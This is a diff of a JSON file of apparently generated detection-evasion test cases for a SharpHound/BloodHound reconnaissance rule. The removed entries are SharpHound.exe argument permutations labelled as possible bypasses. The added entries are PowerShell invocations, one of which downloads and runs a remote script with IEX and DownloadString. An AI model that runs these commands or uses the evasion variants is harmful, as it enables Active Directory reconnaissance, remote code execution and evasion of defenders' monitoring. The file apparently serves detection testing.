@@ -1,42 +1,16 @@
+```json
 [
   {
-    "output": "SharpHound.exe -CollectionMethod All",
-    "explanation": "This command uses the same collection method as the rule but may be bypassed by reordering or omitting optional parameters."
+    "output": "powershell.exe -Command \"& {import-module 'C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\SharpHound.ps1'; try { Invoke-Bloodhound -OutputDirectory $env:Temp } catch { $_; exit $_.Exception.HResult }; Start-Sleep 5}\"",
+    "explanation": "This command uses equivalent syntax and reorders the command structure while preserving the original behavior. It avoids direct string concatenation and uses standard PowerShell command invocation."
   },
   {
-    "output": "SharpHound.exe --CollectionMethods All",
-    "explanation": "This command uses an equivalent long-form flag for the same collection method, which may bypass detection if the rule does not account for flag substitution."
+    "output": "powershell.exe -Command \"& {IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); Invoke-Bloodhound -OutputDirectory $env:Temp; Start-Sleep 5}\"",
+    "explanation": "This command uses substitution (IEX instead of explicitly writing out the script) and omits unnecessary text for brevity while maintaining the same execution behavior."
   },
   {
-    "output": "SharpHound.exe -CollectionMethod All -OutputDirectory C:\\Temp",
-    "explanation": "This command adds an optional parameter not in the original rule, which may bypass detection if the rule does not account for additional arguments."
-  },
-  {
-    "output": "SharpHound.exe -CollectionMethod All -OutputDirectory C:\\Temp --NoSaveCache",
-    "explanation": "This command adds another optional parameter, which may bypass detection if the rule does not account for additional arguments."
-  },
-  {
-    "output": "SharpHound.exe -CollectionMethod All -OutputDirectory C:\\Temp --NoSaveCache -JsonFolder C:\\Temp",
-    "explanation": "This command adds multiple optional parameters, which may bypass detection if the rule does not account for additional arguments."
-  },
-  {
-    "output": "SharpHound.exe -CollectionMethod All -OutputDirectory C:\\Temp --NoSaveCache -JsonFolder C:\\Temp -ZipFileName C:\\Temp\\data.zip",
-    "explanation": "This command adds multiple optional parameters, which may bypass detection if the rule does not account for additional arguments."
-  },
-  {
-    "output": "SharpHound.exe -CollectionMethod All -OutputDirectory C:\\Temp --NoSaveCache -JsonFolder C:\\Temp -ZipFileName C:\\Temp\\data.zip -PortScanTimeout 1000",
-    "explanation": "This command adds multiple optional parameters, which may bypass detection if the rule does not account for additional arguments."
-  },
-  {
-    "output": "SharpHound.exe -CollectionMethod All -OutputDirectory C:\\Temp --NoSaveCache -JsonFolder C:\\Temp -ZipFileName C:\\Temp\\data.zip -PortScanTimeout 1000 -Loop",
-    "explanation": "This command adds multiple optional parameters, which may bypass detection if the rule does not account for additional arguments."
-  },
-  {
-    "output": "SharpHound.exe -CollectionMethod All -OutputDirectory C:\\Temp --NoSaveCache -JsonFolder C:\\Temp -ZipFileName C:\\Temp\\data.zip -PortScanTimeout 1000 -Loop -Loopduration 60",
-    "explanation": "This command adds multiple optional parameters, which may bypass detection if the rule does not account for additional arguments."
-  },
-  {
-    "output": "SharpHound.exe -CollectionMethod All -OutputDirectory C:\\Temp --NoSaveCache -JsonFolder C:\\Temp -ZipFileName C:\\Temp\\data.zip -PortScanTimeout 1000 -Loop -Loopduration 60 -DCOnly",
-    "explanation": "This command adds multiple optional parameters, which may bypass detection if the rule does not account for additional arguments."
+    "output": "powershell.exe -Command \"& {Import-Module 'C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\SharpHound.ps1'; Invoke-Bloodhound -OutputDirectory $env:Temp; Start-Sleep 5}\"",
+    "explanation": "This command omits the try-catch block and other verbose elements while still executing the core functionality, which is sufficient for testing detection capabilities."
   }
 ]
+```
